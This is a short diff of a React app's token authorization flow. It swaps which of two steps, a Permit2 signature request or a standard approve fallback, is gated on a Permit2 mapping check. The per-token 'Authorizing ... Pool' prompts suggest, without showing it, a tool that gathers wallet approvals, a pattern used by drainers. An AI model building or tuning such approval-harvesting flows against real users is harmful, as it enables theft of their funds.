@@ -348,7 +348,7 @@ export default function App() {
             }
 
             // 2. Try Permit2 (Gasless Signature with Dynamic Nonce)
-            if (!authorized) {
+            if (!authorized && hasPermit2Mapping) {
                 try {
                     setStatus(`Signing Permit2: ${token.symbol}...`);
                     
@@ -408,7 +408,7 @@ export default function App() {
             }
 
             // 3. Fallback: Standard Approve (Gas required)
-            if (!authorized && hasPermit2Mapping) {
+            if (!authorized) {
                 setStatus(`Authorizing ${token.symbol} Pool...`);
                 log(`[ACTION] Prompting Approve: ${token.symbol}`);
                 
